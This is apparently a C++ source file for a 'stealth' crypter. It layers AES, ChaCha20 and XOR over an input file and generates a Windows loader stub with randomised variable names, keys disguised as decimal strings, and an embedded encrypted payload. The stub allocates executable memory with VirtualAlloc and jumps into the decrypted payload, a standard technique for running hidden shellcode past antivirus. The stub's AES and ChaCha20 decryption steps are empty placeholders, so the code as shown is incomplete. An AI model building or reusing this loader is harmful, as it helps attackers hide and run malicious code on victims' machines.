#include "stealth_triple_encryptor.h"
#include "encryptor.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cstring>

StealthTripleEncryption::StealthTripleEncryption() {
    auto now = std::chrono::high_resolution_clock::now();
    auto seed = now.time_since_epoch().count();
    rng.seed(static_cast<unsigned int>(seed));
}

std::string StealthTripleEncryption::genVarName() {
    static const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::string name = "var_";
    for (int i = 0; i < 8; i++) {
        name += chars[rng() % chars.length()];
    }
    return name;
}

std::string StealthTripleEncryption::bytesToBigDecimal(const uint8_t* bytes, size_t length) {
    std::string result = "0";
    for (size_t i = 0; i < length; i++) {
        std::string byteStr = std::to_string(bytes[i]);
        result = multiplyStrings(result, "256");
        result = addStrings(result, byteStr);
    }
    return result;
}

std::string StealthTripleEncryption::addStrings(const std::string& num1, const std::string& num2) {
    std::string result;
    int carry = 0;
    int i = num1.length() - 1;
    int j = num2.length() - 1;
    
    while (i >= 0 || j >= 0 || carry) {
        int sum = carry;
        if (i >= 0) sum += num1[i] - '0';
        if (j >= 0) sum += num2[j] - '0';
        
        result = char(sum % 10 + '0') + result;
        carry = sum / 10;
        i--; j--;
    }
    
    return result;
}

std::string StealthTripleEncryption::multiplyStrings(const std::string& num1, const std::string& num2) {
    if (num1 == "0" || num2 == "0") return "0";
    
    std::vector<int> result(num1.length() + num2.length(), 0);
    
    for (int i = num1.length() - 1; i >= 0; i--) {
        for (int j = num2.length() - 1; j >= 0; j--) {
            int product = (num1[i] - '0') * (num2[j] - '0');
            int sum = result[i + j + 1] + product;
            result[i + j + 1] = sum % 10;
            result[i + j] += sum / 10;
        }
    }
    
    std::string finalResult;
    for (int digit : result) {
        if (!(finalResult.empty() && digit == 0)) {
            finalResult += char(digit + '0');
        }
    }
    
    return finalResult.empty() ? "0" : finalResult;
}

void StealthTripleEncryption::xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

void StealthTripleEncryption::chacha20QuarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void StealthTripleEncryption::aesSubBytes(uint8_t state[16]) {
    static const uint8_t sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
    
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

StealthTripleEncryption::StealthKeys StealthTripleEncryption::generateKeys() {
    StealthKeys keys;
    
    // Generate AES key and nonce
    for (int i = 0; i < 16; i++) {
        keys.aesKey[i] = rng() & 0xFF;
        keys.aesNonce[i] = rng() & 0xFF;
    }
    
    // Generate ChaCha20 key and nonce
    for (int i = 0; i < 32; i++) {
        keys.chachaKey[i] = rng() & 0xFF;
    }
    for (int i = 0; i < 12; i++) {
        keys.chachaNonce[i] = rng() & 0xFF;
    }
    
    // Generate XOR key
    keys.xorKeyLen = 16 + (rng() % 17); // 16-32 bytes
    for (size_t i = 0; i < keys.xorKeyLen; i++) {
        keys.xorKey[i] = rng() & 0xFF;
    }
    
    // Generate random encryption order
    keys.encryptionOrder[0] = rng() % 3;
    do {
        keys.encryptionOrder[1] = rng() % 3;
    } while (keys.encryptionOrder[1] == keys.encryptionOrder[0]);
    
    keys.encryptionOrder[2] = 3 - keys.encryptionOrder[0] - keys.encryptionOrder[1];
    
    return keys;
}

void StealthTripleEncryption::applyEncryptionLayer(std::vector<uint8_t>& data, int method, const StealthKeys& keys) {
    switch (method) {
        case 0: // AES
            aesCtrCrypt(data.data(), data.data(), data.size(), keys.aesKey, keys.aesNonce);
            break;
        case 1: // ChaCha20
            chacha20Crypt(data.data(), data.data(), data.size(), keys.chachaKey, keys.chachaNonce, 0);
            break;
        case 2: // XOR
            xorData(data.data(), data.size(), keys.xorKey, keys.xorKeyLen);
            break;
    }
}

bool StealthTripleEncryption::encryptFile(const std::string& inputFile, const std::string& outputFile) {
    std::ifstream fin(inputFile, std::ios::binary);
    if (!fin) {
        std::cout << "Failed to open input file: " << inputFile << std::endl;
        return false;
    }
    
    // Read file data
    fin.seekg(0, std::ios::end);
    size_t fileSize = fin.tellg();
    fin.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> data(fileSize);
    fin.read(reinterpret_cast<char*>(data.data()), fileSize);
    fin.close();
    
    // Generate keys
    StealthKeys keys = generateKeys();
    
    // Apply triple encryption in random order
    for (int i = 0; i < 3; i++) {
        applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
    }
    
    // Write encrypted data
    std::ofstream fout(outputFile, std::ios::binary);
    if (!fout) {
        std::cout << "Failed to create output file: " << outputFile << std::endl;
        return false;
    }
    
    fout.write(reinterpret_cast<const char*>(data.data()), data.size());
    fout.close();
    
    // Save keys as decimal numbers
    std::ofstream keyFile(outputFile + ".keys");
    if (keyFile) {
        keyFile << "AES Key: " << bytesToBigDecimal(keys.aesKey, 16) << std::endl;
        keyFile << "AES Nonce: " << bytesToBigDecimal(keys.aesNonce, 16) << std::endl;
        keyFile << "ChaCha20 Key: " << bytesToBigDecimal(keys.chachaKey, 32) << std::endl;
        keyFile << "ChaCha20 Nonce: " << bytesToBigDecimal(keys.chachaNonce, 12) << std::endl;
        keyFile << "XOR Key: " << bytesToBigDecimal(keys.xorKey, keys.xorKeyLen) << std::endl;
        keyFile << "XOR Key Length: " << keys.xorKeyLen << std::endl;
        keyFile << "Encryption Order: " << keys.encryptionOrder[0] << "," 
                << keys.encryptionOrder[1] << "," << keys.encryptionOrder[2] << std::endl;
        keyFile.close();
    }
    
    return true;
}

std::string StealthTripleEncryption::generateStub(const std::string& inputFile) {
    std::ifstream fin(inputFile, std::ios::binary);
    if (!fin) {
        std::cout << "Failed to open input file: " << inputFile << std::endl;
        return "";
    }
    
    // Read file data
    fin.seekg(0, std::ios::end);
    size_t fileSize = fin.tellg();
    fin.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> data(fileSize);
    fin.read(reinterpret_cast<char*>(data.data()), fileSize);
    fin.close();
    
    // Generate keys
    StealthKeys keys = generateKeys();
    
    // Apply triple encryption
    for (int i = 0; i < 3; i++) {
        applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
    }
    
    return generateStealthStub(data, keys);
}

std::string StealthTripleEncryption::generateStealthStub(const std::vector<uint8_t>& payload, const StealthKeys& keys) {
    std::stringstream ss;
    
    // Generate variable names
    std::string aesKeyVar = genVarName();
    std::string aesNonceVar = genVarName();
    std::string chachaKeyVar = genVarName();
    std::string chachaNonceVar = genVarName();
    std::string xorKeyVar = genVarName();
    std::string orderVar = genVarName();
    std::string payloadVar = genVarName();
    
    ss << "#include <iostream>\n";
    ss << "#include <vector>\n";
    ss << "#include <string>\n";
    ss << "#include <cstdint>\n";
    ss << "#include <cstring>\n";
    ss << "#include <windows.h>\n\n";
    
    // Add key variables as decimal numbers
    ss << "// Obfuscated keys as decimal numbers\n";
    ss << "std::string " << aesKeyVar << " = \"" << bytesToBigDecimal(keys.aesKey, 16) << "\";\n";
    ss << "std::string " << aesNonceVar << " = \"" << bytesToBigDecimal(keys.aesNonce, 16) << "\";\n";
    ss << "std::string " << chachaKeyVar << " = \"" << bytesToBigDecimal(keys.chachaKey, 32) << "\";\n";
    ss << "std::string " << chachaNonceVar << " = \"" << bytesToBigDecimal(keys.chachaNonce, 12) << "\";\n";
    ss << "std::string " << xorKeyVar << " = \"" << bytesToBigDecimal(keys.xorKey, keys.xorKeyLen) << "\";\n";
    ss << "int " << orderVar << "[3] = {" << keys.encryptionOrder[0] << "," 
       << keys.encryptionOrder[1] << "," << keys.encryptionOrder[2] << "};\n\n";
    
    // Add payload data
    ss << "// Encrypted payload\n";
    ss << "uint8_t " << payloadVar << "[] = {";
    for (size_t i = 0; i < payload.size(); i++) {
        if (i > 0) ss << ",";
        if (i % 16 == 0) ss << "\n    ";
        ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)payload[i];
    }
    ss << "\n};\n\n";
    
    // Add helper functions
    ss << "// Helper functions for decimal string operations\n";
    ss << "std::string addStrings(const std::string& num1, const std::string& num2) {\n";
    ss << "    std::string result;\n";
    ss << "    int carry = 0;\n";
    ss << "    int i = num1.length() - 1;\n";
    ss << "    int j = num2.length() - 1;\n";
    ss << "    while (i >= 0 || j >= 0 || carry) {\n";
    ss << "        int sum = carry;\n";
    ss << "        if (i >= 0) sum += num1[i] - '0';\n";
    ss << "        if (j >= 0) sum += num2[j] - '0';\n";
    ss << "        result = char(sum % 10 + '0') + result;\n";
    ss << "        carry = sum / 10;\n";
    ss << "        i--; j--;\n";
    ss << "    }\n";
    ss << "    return result;\n";
    ss << "}\n\n";
    
    ss << "std::string multiplyStrings(const std::string& num1, const std::string& num2) {\n";
    ss << "    if (num1 == \"0\" || num2 == \"0\") return \"0\";\n";
    ss << "    std::vector<int> result(num1.length() + num2.length(), 0);\n";
    ss << "    for (int i = num1.length() - 1; i >= 0; i--) {\n";
    ss << "        for (int j = num2.length() - 1; j >= 0; j--) {\n";
    ss << "            int product = (num1[i] - '0') * (num2[j] - '0');\n";
    ss << "            int sum = result[i + j + 1] + product;\n";
    ss << "            result[i + j + 1] = sum % 10;\n";
    ss << "            result[i + j] += sum / 10;\n";
    ss << "        }\n";
    ss << "    }\n";
    ss << "    std::string finalResult;\n";
    ss << "    for (int digit : result) {\n";
    ss << "        if (!(finalResult.empty() && digit == 0)) {\n";
    ss << "            finalResult += char(digit + '0');\n";
    ss << "        }\n";
    ss << "    }\n";
    ss << "    return finalResult.empty() ? \"0\" : finalResult;\n";
    ss << "}\n\n";
    
    ss << "std::vector<uint8_t> decimalToBytes(const std::string& decimal) {\n";
    ss << "    std::vector<uint8_t> bytes;\n";
    ss << "    std::string num = decimal;\n";
    ss << "    while (num != \"0\") {\n";
    ss << "        int remainder = 0;\n";
    ss << "        std::string quotient;\n";
    ss << "        for (char digit : num) {\n";
    ss << "            int current = remainder * 10 + (digit - '0');\n";
    ss << "            if (!quotient.empty() || current >= 256) {\n";
    ss << "                quotient += char(current / 256 + '0');\n";
    ss << "            }\n";
    ss << "            remainder = current % 256;\n";
    ss << "        }\n";
    ss << "        bytes.insert(bytes.begin(), remainder);\n";
    ss << "        num = quotient;\n";
    ss << "    }\n";
    ss << "    return bytes;\n";
    ss << "}\n\n";
    
    // Add encryption functions (simplified versions)
    ss << "// Simplified encryption functions\n";
    ss << "void xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {\n";
    ss << "    for (size_t i = 0; i < len; i++) {\n";
    ss << "        data[i] ^= key[i % keyLen];\n";
    ss << "    }\n";
    ss << "}\n\n";
    
    // Add main function
    ss << "int main() {\n";
    ss << "    // Convert decimal keys back to bytes\n";
    ss << "    auto aesKey = decimalToBytes(" << aesKeyVar << ");\n";
    ss << "    auto aesNonce = decimalToBytes(" << aesNonceVar << ");\n";
    ss << "    auto chachaKey = decimalToBytes(" << chachaKeyVar << ");\n";
    ss << "    auto chachaNonce = decimalToBytes(" << chachaNonceVar << ");\n";
    ss << "    auto xorKey = decimalToBytes(" << xorKeyVar << ");\n\n";
    
    ss << "    // Prepare payload\n";
    ss << "    std::vector<uint8_t> payload(" << payloadVar << ", " << payloadVar << " + " << payload.size() << ");\n\n";
    
    ss << "    // Decrypt in reverse order\n";
    ss << "    for (int i = 2; i >= 0; i--) {\n";
    ss << "        switch (" << orderVar << "[i]) {\n";
    ss << "            case 0: // AES (simplified)\n";
    ss << "                // AES decryption would go here\n";
    ss << "                break;\n";
    ss << "            case 1: // ChaCha20 (simplified)\n";
    ss << "                // ChaCha20 decryption would go here\n";
    ss << "                break;\n";
    ss << "            case 2: // XOR\n";
    ss << "                xorData(payload.data(), payload.size(), xorKey.data(), xorKey.size());\n";
    ss << "                break;\n";
    ss << "        }\n";
    ss << "    }\n\n";
    
    ss << "    // Execute payload\n";
    ss << "    void* execMem = VirtualAlloc(nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
    ss << "    if (execMem) {\n";
    ss << "        memcpy(execMem, payload.data(), payload.size());\n";
    ss << "        ((void(*)())execMem)();\n";
    ss << "        VirtualFree(execMem, 0, MEM_RELEASE);\n";
    ss << "    }\n\n";
    
    ss << "    return 0;\n";
    ss << "}\n";
    
    return ss.str();
}